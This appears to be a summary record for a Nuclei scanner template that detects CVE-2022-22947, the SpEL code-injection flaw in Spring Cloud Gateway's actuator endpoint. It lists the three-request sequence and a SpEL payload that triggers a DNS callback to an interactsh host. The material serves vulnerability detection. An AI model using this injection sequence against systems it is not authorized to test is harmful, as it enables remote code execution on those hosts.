---
cve_id: CVE-2022-22947
template_path: nuclei-templates/http/cves/2022/CVE-2022-22947.yaml
affected_product: Spring Cloud Gateway
severity: critical
authentication: none
external_callback: true
affected_versions: prior to 3.1.1+ and 3.0.7+
preconditions: Gateway Actuator endpoint enabled, exposed and unsecured
poc_classification: rce
---

## Vulnerability

Applications using Spring Cloud Gateway prior to 3.1.1+ and 3.0.7+ are vulnerable to a code injection attack when the Gateway Actuator endpoint is enabled, exposed and unsecured. A remote attacker could make a maliciously crafted request that could allow arbitrary remote execution on the remote host.  
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (score 10). CWE-917, CWE-94.

## PoC / Detection
Classification: rce

The template verifies the vulnerability by issuing three raw requests:  
- POST `/actuator/gateway/routes/{{randstr}}` to create a route containing a malicious `RewritePath` filter with the SpEL expression `#{T(java.net.InetAddress).getByName("{{interactsh-url}}")}`.  
- POST `/actuator/gateway/refresh` to trigger route processing.  
- DELETE `/actuator/gateway/routes/{{randstr}}` for cleanup.  
Matchers confirm success via 201 status code on route creation, presence of the route ID in response headers, and a DNS callback to the interactsh domain.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2022-22947
- https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/
- https://github.com/wdahlenburg/spring-gateway-demo
- https://spring.io/blog/2022/03/01/spring-cloud-gateway-cve-reports-published
- https://tanzu.vmware.com/security/cve-2022-22947
